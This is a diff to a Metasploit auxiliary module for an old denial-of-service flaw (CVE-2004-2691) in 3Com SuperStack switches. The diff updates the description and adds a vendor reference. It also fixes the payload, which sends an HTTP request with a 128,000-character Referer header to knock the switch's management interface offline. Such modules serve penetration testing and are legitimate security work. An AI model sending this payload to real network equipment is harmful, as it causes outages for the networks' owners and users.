@@ -25,8 +25,9 @@ class Metasploit3 < Msf::Auxiliary
 				This module causes a temporary denial of service condition
 				against 3Com SuperStack switches. By sending excessive data
 				to the HTTP Management interface, the switch stops responding
-				temporarily, causing a temporary network outage. The device does
-				not reset. Tested successfully against a 3300SM firmware v2.66.
+				temporarily. The device does not reset. Tested successfully
+				against a 3300SM firmware v2.66. Reported to affect versions
+				prior to v2.72.
 			},
 			'Author'         => [ 'patrick' ],
 			'License'        => MSF_LICENSE,
@@ -36,6 +37,7 @@ class Metasploit3 < Msf::Auxiliary
 					# patrickw - I am not sure if these are correct, but the closest match!
 					[ 'OSVDB', '7246' ],
 					[ 'CVE', '2004-2691' ],
+					[ 'URL', 'http://support.3com.com/infodeli/tools/switches/dna1695-0aaa17.pdf' ],
 				],
 			'DisclosureDate' => 'Jun 24 2004'))
 			
@@ -48,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Sending DoS packet to #{rhost}:#{rport}")
 
 			sploit = "GET / HTTP/1.0\r\n"
-			sploit << "Referrer: " + Rex::Text.rand_text_alpha(1) * 128000
+			sploit << "Referer: " + Rex::Text.rand_text_alpha(1) * 128000
 
 			sock.put(sploit +"\r\n\r\n")
 			disconnect
